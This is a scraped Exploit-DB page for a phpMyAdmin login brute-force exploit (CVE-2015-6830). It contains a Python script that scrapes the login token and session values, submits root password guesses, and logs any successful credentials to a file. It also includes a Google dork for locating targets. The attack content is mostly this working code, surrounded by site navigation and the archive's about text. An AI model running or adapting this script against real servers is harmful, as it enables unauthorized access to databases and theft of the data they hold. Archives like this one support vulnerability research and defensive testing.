@@ -1,0 +1,216 @@
+---
+title: [remote] PHPMyAdmin 3.0 - Bruteforce Login Bypass
+url: https://www.exploit-db.com/exploits/52414
+source: Exploit-DB.com RSS Feed
+date: 2025-08-19
+fetch_date: 2025-10-07T00:16:17.599081
+---
+
+# [remote] PHPMyAdmin 3.0 - Bruteforce Login Bypass
+
+[![Exploit Database](/images/spider-white.png)](/)
+[Exploit Database](/)
+
+* [Exploits](/)
+* [GHDB](/google-hacking-database)
+* [Papers](/papers)
+* [Shellcodes](/shellcodes)
+
+---
+
+* [Search EDB](/search)
+* [SearchSploit Manual](/searchsploit)
+* [Submissions](/submit)
+
+---
+
+* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
+
+[![Exploit Database](/images/edb-logo.png)](/)
+
+* [Stats](/exploit-database-statistics)
+* [About Us](/)
+
+  [About Exploit-DB](/about-exploit-db)
+  [Exploit-DB History](/history)
+  [FAQ](/faq)
+* Search
+
+# PHPMyAdmin 3.0 - Bruteforce Login Bypass
+
+#### EDB-ID:
+
+###### 52414
+
+#### CVE:
+
+###### [2015-6830](https://nvd.nist.gov/vuln/detail/CVE-2015-6830)
+
+---
+
+**EDB Verified:**
+
+#### Author:
+
+###### [Nikola Markovic](/?author=12310)
+
+#### Type:
+
+###### [remote](/?type=remote)
+
+---
+
+#### Platform:
+
+###### [PHP](/?platform=php)
+
+#### Date:
+
+###### 2025-08-18
+
+---
+
+**Vulnerable App:**
+
+```
+"""
+Exploit-Title: PHPMyAdmin 3.0 - Bruteforce Login Bypass
+Author: Nikola Markovic (badgerinc23@gmail.com)
+Date: 2023
+Google-Dork: intext: phpMyAdmin
+Vendor: https://www.phpmyadmin.net/
+Version: >3.0 & 4.3.x before 4.3.13.2 and 4.4.x before 4.4.14.1
+Tested on: win/linux/unix
+Python-Version: 3.0
+CVE : CVE-2015-6830
+"""
+import urllib.request
+import urllib.parse
+import urllib
+import threading
+import http.cookiejar
+import re
+import sys
+
+def CheckLogin(target):
+	passwords = ["123"]
+	try:
+		for password in passwords:
+			print("Try Host: "+target+" with Combo: root/"+password+"!\n")
+			load_token = urllib.request.Request(target)
+			fetch_token = urllib.request.urlopen(load_token,timeout=2).read()
+			token = re.findall(r'name="token" value="([\w\.-]+)"',fetch_token.decode('utf-8')) # token fetching
+			session = re.findall(r'name="set_session" value="([\w\.-]+)"',fetch_token.decode('utf-8')) ## session token fetching
+			login_data = urllib.parse.urlencode({ 'pma_username': "root", 'pma_password': password,'set_session': session[0], 'token':token}) ## injecting payload to bruteforce
+			login = login_data.encode()
+			cookies = http.cookiejar.CookieJar()
+			opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookies))
+			do_it = opener.open(target,login,timeout=2)
+			check = do_it.read()
+			if b"index.php?route=/logout" in check:
+				f = open('bruted_pma','a')
+				f.write(target+" Bruted: root/"+password+"\n")
+				f.close()
+	except:
+		pass
+
+if sys.argv[1]:
+		t = threading.Thread(target=CheckLogin,args=(str(sys.argv[1]),))
+		if threading.active_count() < 500:
+			t.start()
+		else:
+			t.start()
+			t.join()
+```
+
+**Tags:**
+
+**Advisory/Source:**
+Link
+
+| **Databases** | **Links** | **Sites** | **Solutions** |
+| --- | --- | --- | --- |
+| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
+| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
+| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
+| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
+|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |
+
+Databases
+
+[Exploits](/)
+[Google Hacking](/google-hacking-database)
+[Papers](/papers)
+[Shellcodes](/shellcodes)
+
+Links
+
+[Search Exploit-DB](/search)
+[Submit Entry](/submit)
+[SearchSploit Manual](/searchsploit)
+[Exploit Statistics](/statistics)
+
+Sites
+
+[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
+[Kali Linux](https://www.kali.org/)
+[VulnHub](https://www.vulnhub.com/)
+
+Solutions
+
+[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
+[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
+[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
+[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
+[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)
+
+* [Exploit Database by OffSec](/)
+* [Terms](/terms)
+* [Privacy](/privacy)
+* [About Us](/about-exploit-db)
+* [FAQ](/faq)
+* [Cookies](/cookies)
+
+©
+[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.
+
+##### About The Exploit Database
+
+×
+
+[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
+The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
+that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
+non-profit project that is provided as a public service by OffSec.
+
+The Exploit Database is a [CVE
+compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
+developed for use by penetration testers and vulnerability researchers. Our aim is to serve
+the most comprehensive collection of exploits gathered through direct submissions, mailing
+lists, as well as other public sources, and present them in a freely-available and
+easy-to-navigate database. The Exploit Database is a repository for exploits and
+proof-of-concepts rather than advisories, making it a valuable resource for those who need
+actionable data right away.
+
+The [Google Hacking Database (GHDB)](/google-hacking-database)
+is a categorized index of Internet search engine queries designed to uncover interesting,
+and usually sensitive, information made publicly available on the Internet. In most cases,
+this information was never meant to be made public but due to any number of factors this
+information was linked in a web document that was crawled by a search engine that
+subsequently followed that link and indexed the sensitive information.
+
+The process known as “Google Hacking” was popularized in 2000 by Johnny
+Long, a professional hacker, who began cataloging these queries in a database known as the
+Google Hacking Database. His initial efforts were amplified by countless hours of community
+member effort, documented in the book Google Hacking For Penetration Testers and popularised
+by a barrage of media attention and Johnny’s talks on the subject such as this early talk
+recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
+to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
+the fact that this was not a “Google problem” but rather the result of an often
+unintentional misconfiguration on the part of a user or a program installed by the user.
+Over time, the term “dork” became shorthand for a search query that located sensitive
+information and “dorks” were included with may web application vulnerability releases to
+show examples of vulnerable web sites.
+
+After nearly a decade of hard work by the community, Johnny turned the GHDB
+over to [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_mediu...
